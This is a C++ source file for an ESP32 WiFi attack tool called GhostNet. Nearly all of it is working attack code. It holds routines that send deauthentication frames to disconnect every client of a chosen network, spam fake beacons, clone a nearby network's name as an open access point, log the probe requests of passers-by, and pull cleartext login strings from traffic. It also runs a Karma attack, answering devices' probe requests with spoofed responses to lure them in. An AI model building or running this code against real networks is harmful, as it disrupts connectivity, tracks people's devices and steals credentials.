/*
 * ============================================================
 *  GhostNet — wifi_module.cpp
 *  WiFi Scanning, Deauthentication, Beacon Spam, AP Clone, Probe Sniffer
 * ============================================================
 */

#include "wifi_module.h"
#include "utils.h"
#include <WiFi.h>
#include <esp_wifi.h>

WifiModule wifiModule;

const char* WifiModule::FUNNY_SSIDS[] = {
  "FBI Surveillance Van #42",
  "Totally Not A Virus",
  "Drop It Like Its Hotspot",
  "Yell PASSWORD for WiFi",
  "Skynet Global Defense",
  "Loading...",
  "Virus.exe Detected",
  "Searching...",
  "Click Here for Free RAM",
  "Area 51 Research Lab"
};
const int WifiModule::FUNNY_SSID_COUNT = sizeof(WifiModule::FUNNY_SSIDS) / sizeof(WifiModule::FUNNY_SSIDS[0]);

const char* WifiModule::RICKROLL_SSIDS[] = {
  "01 Never Gonna Give You Up",
  "02 Never Gonna Let You Down",
  "03 Never Gonna Run Around",
  "04 And Desert You",
  "05 Never Gonna Make You Cry",
  "06 Never Gonna Say Goodbye",
  "07 Never Gonna Tell A Lie",
  "08 And Hurt You"
};
const int WifiModule::RICKROLL_SSID_COUNT = sizeof(WifiModule::RICKROLL_SSIDS) / sizeof(WifiModule::RICKROLL_SSIDS[0]);

WifiModule::WifiModule() {
  _networkCount = 0;
  _deauthRunning = false;
  _deauthTarget = -1;
  _deauthCount = 0;
  _lastDeauthMs = 0;
  _beaconRunning = false;
  _beaconMode = BEACON_RANDOM;
  _beaconCount = 0;
  _lastBeaconMs = 0;
  _currentChannel = 1;
  _apCloneRunning = false;
  _apCloneClients = 0;
  _karmaRunning = false;
  _karmaTrappedCount = 0;
  strcpy(_lastKarmaSSID, "None");
  _lastKarmaMs = 0;
  _probeSniffing = false;
  _probeCount = 0;
  _credSniffing = false;
  _sniffedCredCount = 0;
}

void WifiModule::init() {
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  delay(100);
}

int WifiModule::scanNetworks() {
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  delay(50);
  
  int n = WiFi.scanNetworks(false, true, false, 200); // scan all channels
  if (n < 0) n = 0;
  
  _networkCount = min(n, MAX_NETWORKS);
  for (int i = 0; i < _networkCount; i++) {
    strncpy(_networks[i].ssid, WiFi.SSID(i).c_str(), 32);
    _networks[i].ssid[32] = '\0';
    if (strlen(_networks[i].ssid) == 0) {
      strcpy(_networks[i].ssid, "<Hidden SSID>");
    }
    memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
    _networks[i].rssi = WiFi.RSSI(i);
    _networks[i].channel = WiFi.channel(i);
    _networks[i].encType = (uint8_t)WiFi.encryptionType(i);
  }
  WiFi.scanDelete();
  return _networkCount;
}

int WifiModule::getNetworkCount() const { return _networkCount; }
NetworkInfo* WifiModule::getNetwork(int index) {
  if (index >= 0 && index < _networkCount) return &_networks[index];
  return nullptr;
}
NetworkInfo* WifiModule::getNetworks() { return _networks; }

// ── Raw Deauth Frame Generation ─────────────────────────────
void WifiModule::_buildDeauthFrame(uint8_t* frame, const uint8_t* bssid, const uint8_t* dst, uint16_t seq) {
  frame[0] = 0xC0; // Frame Control: Deauthentication
  frame[1] = 0x00;
  frame[2] = 0x00; // Duration
  frame[3] = 0x00;
  
  memcpy(&frame[4], dst, 6);   // Destination Address (broadcast or STA)
  memcpy(&frame[10], bssid, 6); // Source Address (AP)
  memcpy(&frame[16], bssid, 6); // BSSID
  
  frame[22] = (seq << 4) & 0xF0;
  frame[23] = (seq >> 4) & 0xFF;
  
  frame[24] = DEAUTH_REASON; // Reason code (7 = Class 3 frame received from nonassociated STA)
  frame[25] = 0x00;
}

void WifiModule::startDeauth(int targetIndex) {
  if (targetIndex < 0 || targetIndex >= _networkCount) return;
  _deauthTarget = targetIndex;
  _deauthRunning = true;
  _deauthCount = 0;
  _lastDeauthMs = millis();

  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(_networks[_deauthTarget].channel, WIFI_SECOND_CHAN_NONE);
}

void WifiModule::stopDeauth() {
  _deauthRunning = false;
  _deauthTarget = -1;
}

void WifiModule::sendDeauthFrame() {
  if (!_deauthRunning || _deauthTarget < 0) return;
  if (millis() - _lastDeauthMs < DEAUTH_INTERVAL_MS) return;
  _lastDeauthMs = millis();

  uint8_t deauthPacket[26];
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

  // 1. AP -> Broadcast (disconnect all clients)
  _buildDeauthFrame(deauthPacket, _networks[_deauthTarget].bssid, broadcast, _deauthCount);
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
  _deauthCount++;

  // 2. Broadcast -> AP
  _buildDeauthFrame(deauthPacket, broadcast, _networks[_deauthTarget].bssid, _deauthCount);
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
  _deauthCount++;
}

bool WifiModule::isDeauthRunning() const { return _deauthRunning; }
uint32_t WifiModule::getDeauthCount() const { return _deauthCount; }
int WifiModule::getDeauthTargetIndex() const { return _deauthTarget; }

// ── Raw Beacon Frame Generation ─────────────────────────────
void WifiModule::_buildBeaconFrame(uint8_t* frame, int* frameLen, const char* ssid, const uint8_t* srcMac, uint8_t channel) {
  uint8_t ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;

  // 802.11 Beacon header
  uint8_t beaconHeader[] = {
    0x80, 0x00,                         // Frame Control: Beacon
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Spoofed MAC)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Seq / Frag
    // Fixed parameters
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,                         // Beacon Interval (100 TU)
    0x31, 0x04                          // Capability info (ESS + Privacy)
  };

  memcpy(&beaconHeader[10], srcMac, 6);
  memcpy(&beaconHeader[16], srcMac, 6);

  int offset = 0;
  memcpy(frame, beaconHeader, sizeof(beaconHeader));
  offset += sizeof(beaconHeader);

  // Tag: SSID parameter set
  frame[offset++] = 0x00; // Tag Number (SSID)
  frame[offset++] = ssidLen;
  memcpy(&frame[offset], ssid, ssidLen);
  offset += ssidLen;

  // Tag: Supported Rates (1, 2, 5.5, 11 Mbps)
  uint8_t supportedRates[] = {0x01, 0x04, 0x82, 0x84, 0x8b, 0x96};
  memcpy(&frame[offset], supportedRates, sizeof(supportedRates));
  offset += sizeof(supportedRates);

  // Tag: DS Parameter Set (Current Channel)
  frame[offset++] = 0x03; // Tag Number (DS Parameter)
  frame[offset++] = 0x01; // Tag length
  frame[offset++] = channel;

  *frameLen = offset;
}

void WifiModule::startBeaconSpam(BeaconMode mode) {
  _beaconMode = mode;
  _beaconRunning = true;
  _beaconCount = 0;
  _lastBeaconMs = millis();
  _currentChannel = 1;

  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
}

void WifiModule::stopBeaconSpam() {
  _beaconRunning = false;
}

void WifiModule::sendBeaconFrame() {
  if (!_beaconRunning) return;
  if (millis() - _lastBeaconMs < BEACON_INTERVAL_MS) return;
  _lastBeaconMs = millis();

  char ssid[33];
  uint8_t srcMac[6];
  randomMAC(srcMac);

  if (_beaconMode == BEACON_RANDOM) {
    randomSSID(ssid, 12);
  } else if (_beaconMode == BEACON_FUNNY) {
    int idx = _beaconCount % FUNNY_SSID_COUNT;
    strncpy(ssid, FUNNY_SSIDS[idx], 32);
    ssid[32] = '\0';
  } else if (_beaconMode == BEACON_RICKROLL) {
    int idx = _beaconCount % RICKROLL_SSID_COUNT;
    strncpy(ssid, RICKROLL_SSIDS[idx], 32);
    ssid[32] = '\0';
  } else {
    snprintf(ssid, sizeof(ssid), "GhostNet_%04X", (uint16_t)random(0xFFFF));
  }

  uint8_t frame[128];
  int frameLen = 0;
  
  _currentChannel = (_beaconCount % MAX_CHANNELS) + 1;
  esp_wifi_set_channel(_currentChannel, WIFI_SECOND_CHAN_NONE);

  _buildBeaconFrame(frame, &frameLen, ssid, srcMac, _currentChannel);
  esp_wifi_80211_tx(WIFI_IF_STA, frame, frameLen, false);
  _beaconCount++;
}

bool WifiModule::isBeaconRunning() const { return _beaconRunning; }
uint32_t WifiModule::getBeaconCount() const { return _beaconCount; }
BeaconMode WifiModule::getBeaconMode() const { return _beaconMode; }

// ── AP Clone ────────────────────────────────────────────────
void WifiModule::startAPClone(int targetIndex) {
  if (targetIndex >= 0 && targetIndex < _networkCount) {
    strncpy(_apCloneSSID, _networks[targetIndex].ssid, 32);
    _apCloneSSID[32] = '\0';
  } else {
    strcpy(_apCloneSSID, "GhostClone_AP");
  }
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(_apCloneSSID, nullptr, 6, 0, 8);
  _apCloneRunning = true;
  _apCloneClients = 0;
}

void WifiModule::stopAPClone() {
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_MODE_STA);
  _apCloneRunning = false;
}

bool WifiModule::isAPCloneRunning() const { return _apCloneRunning; }
int WifiModule::getAPCloneClients() const {
  if (!_apCloneRunning) return 0;
  return WiFi.softAPgetStationNum();
}
const char* WifiModule::getAPCloneSSID() const { return _apCloneSSID; }

// ── Probe Sniffer ───────────────────────────────────────────
void WifiModule::probeSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* payload = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;
  if (len < 28) return;

  uint8_t frameType = payload[0];
  if (frameType == 0x40) { // Probe Request
    uint8_t srcMac[6];
    memcpy(srcMac, &payload[10], 6);

    uint8_t ssidLen = payload[25];
    if (ssidLen > 32 || (26 + ssidLen) > len) return;

    char ssid[33];
    if (ssidLen == 0) {
      strcpy(ssid, "<Wildcard/Broadcast>");
    } else {
      memcpy(ssid, &payload[26], ssidLen);
      ssid[ssidLen] = '\0';
    }

    if (wifiModule._probeCount < MAX_PROBES) {
      // Check if duplicate MAC + SSID exists
      for (int i = 0; i < wifiModule._probeCount; i++) {
        if (memcmp(wifiModule._probes[i].srcMac, srcMac, 6) == 0 && strcmp(wifiModule._probes[i].ssid, ssid) == 0) {
          wifiModule._probes[i].rssi = pkt->rx_ctrl.rssi;
          wifiModule._probes[i].timestamp = millis();
          return;
        }
      }
      int idx = wifiModule._probeCount++;
      memcpy(wifiModule._probes[idx].srcMac, srcMac, 6);
      strncpy(wifiModule._probes[idx].ssid, ssid, 32);
      wifiModule._probes[idx].ssid[32] = '\0';
      wifiModule._probes[idx].rssi = pkt->rx_ctrl.rssi;
      wifiModule._probes[idx].channel = pkt->rx_ctrl.channel;
      wifiModule._probes[idx].timestamp = millis();
    }
  }
}

void WifiModule::startProbeSniffer() {
  _probeSniffing = true;
  _probeCount = 0;
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&WifiModule::probeSnifferCb);
}

void WifiModule::stopProbeSniffer() {
  _probeSniffing = false;
  esp_wifi_set_promiscuous(false);
}

bool WifiModule::isProbeSniffing() const { return _probeSniffing; }
int WifiModule::getProbeCount() const { return _probeCount; }
ProbeInfo* WifiModule::getProbe(int index) {
  if (index >= 0 && index < _probeCount) return &_probes[index];
  return nullptr;
}
ProbeInfo* WifiModule::getProbes() { return _probes; }
void WifiModule::clearProbes() { _probeCount = 0; }

// ── Credential Sniffer ──────────────────────────────────────
void WifiModule::credSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA) return;
  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* payload = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;
  if (len < 40) return;

  // Simple string pattern scanning in unencrypted payloads
  String strData = "";
  for (int i = 24; i < len && i < 300; i++) {
    char c = (char)payload[i];
    if (c >= 32 && c <= 126) strData += c;
    else strData += ' ';
  }

  if (wifiModule._sniffedCredCount < MAX_SNIFFED_CREDS) {
    if (strData.indexOf("USER ") >= 0 || strData.indexOf("PASS ") >= 0 || strData.indexOf("password=") >= 0 || strData.indexOf("Authorization: Basic") >= 0) {
      int idx = wifiModule._sniffedCredCount++;
      strcpy(wifiModule._sniffedCreds[idx].protocol, "HTTP/FTP");
      strcpy(wifiModule._sniffedCreds[idx].host, "Cleartext");
      strncpy(wifiModule._sniffedCreds[idx].username, strData.substring(0, 31).c_str(), 31);
      wifiModule._sniffedCreds[idx].username[31] = '\0';
      strcpy(wifiModule._sniffedCreds[idx].password, "*** captured ***");
      wifiModule._sniffedCreds[idx].timestamp = millis();
    }
  }
}

void WifiModule::startCredSniffer() {
  _credSniffing = true;
  _sniffedCredCount = 0;
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&WifiModule::credSnifferCb);
}

void WifiModule::stopCredSniffer() {
  _credSniffing = false;
  esp_wifi_set_promiscuous(false);
}

bool WifiModule::isCredSniffing() const { return _credSniffing; }
int WifiModule::getSniffedCredCount() const { return _sniffedCredCount; }
SniffedCred* WifiModule::getSniffedCred(int index) {
  if (index >= 0 && index < _sniffedCredCount) return &_sniffedCreds[index];
  return nullptr;
}
SniffedCred* WifiModule::getSniffedCreds() { return _sniffedCreds; }
void WifiModule::clearSniffedCreds() { _sniffedCredCount = 0; }

void WifiModule::setChannel(uint8_t ch) {
  _currentChannel = ch;
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}
uint8_t WifiModule::getChannel() const { return _currentChannel; }

// ── Karma Attack Implementation (Bruce Feature) ─────────────
void WifiModule::_buildProbeResponseFrame(uint8_t* frame, int* frameLen, const char* ssid, const uint8_t* dstMac, const uint8_t* bssid, uint8_t channel) {
  uint8_t ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;

  // 802.11 Probe Response Header (Subtype 0x05, Frame Control 0x50)
  uint8_t respHeader[] = {
    0x50, 0x00,                         // Frame Control: Probe Response
    0x00, 0x00,                         // Duration
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (Target client MAC)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Seq / Frag
    // Fixed parameters
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,                         // Beacon Interval (100 TU)
    0x21, 0x04                          // Capability info (ESS + Short Preamble)
  };

  memcpy(&respHeader[4], dstMac, 6);
  memcpy(&respHeader[10], bssid, 6);
  memcpy(&respHeader[16], bssid, 6);

  int offset = 0;
  memcpy(frame, respHeader, sizeof(respHeader));
  offset += sizeof(respHeader);

  // Tag 0: SSID
  frame[offset++] = 0x00;
  frame[offset++] = ssidLen;
  memcpy(&frame[offset], ssid, ssidLen);
  offset += ssidLen;

  // Tag 1: Supported Rates (1, 2, 5.5, 11 Mbps)
  uint8_t supportedRates[] = {0x01, 0x04, 0x82, 0x84, 0x8b, 0x96};
  memcpy(&frame[offset], supportedRates, sizeof(supportedRates));
  offset += sizeof(supportedRates);

  // Tag 3: DS Parameter Set (Current Channel)
  frame[offset++] = 0x03;
  frame[offset++] = 0x01;
  frame[offset++] = channel;

  *frameLen = offset;
}

void WifiModule::karmaSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* payload = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;
  if (len < 28) return;

  uint8_t frameType = payload[0];
  if (frameType == 0x40) { // Probe Request
    uint8_t srcMac[6];
    memcpy(srcMac, &payload[10], 6);

    uint8_t ssidLen = payload[25];
    if (ssidLen == 0 || ssidLen > 32 || (26 + ssidLen) > len) return;

    char ssid[33];
    memcpy(ssid, &payload[26], ssidLen);
    ssid[ssidLen] = '\0';

    // Ignore broadcast/wildcard probes
    if (strlen(ssid) == 0 || strcmp(ssid, "<Wildcard/Broadcast>") == 0) return;

    // Send immediate spoofed Probe Response to trap client
    uint8_t spoofBSSID[6];
    WiFi.macAddress(spoofBSSID);
    spoofBSSID[5] ^= 0x55; // Unique BSSID

    uint8_t frame[128];
    int frameLen = 0;
    uint8_t ch = pkt->rx_ctrl.channel;
    wifiModule._buildProbeResponseFrame(frame, &frameLen, ssid, srcMac, spoofBSSID, ch);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, frameLen, false);

    wifiModule._karmaTrappedCount++;
    strncpy(wifiModule._lastKarmaSSID, ssid, 32);
    wifiModule._lastKarmaSSID[32] = '\0';
    wifiModule._lastKarmaMs = millis();
  }
}

void WifiModule::startKarmaAttack() {
  _karmaRunning = true;
  _karmaTrappedCount = 0;
  strcpy(_lastKarmaSSID, "Listening...");
  _lastKarmaMs = millis();

  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&WifiModule::karmaSnifferCb);
}

void WifiModule::stopKarmaAttack() {
  _karmaRunning = false;
  esp_wifi_set_promiscuous(false);
}

bool WifiModule::isKarmaRunning() const { return _karmaRunning; }
uint32_t WifiModule::getKarmaTrappedCount() const { return _karmaTrappedCount; }
const char* WifiModule::getLastKarmaSSID() const { return _lastKarmaSSID; }

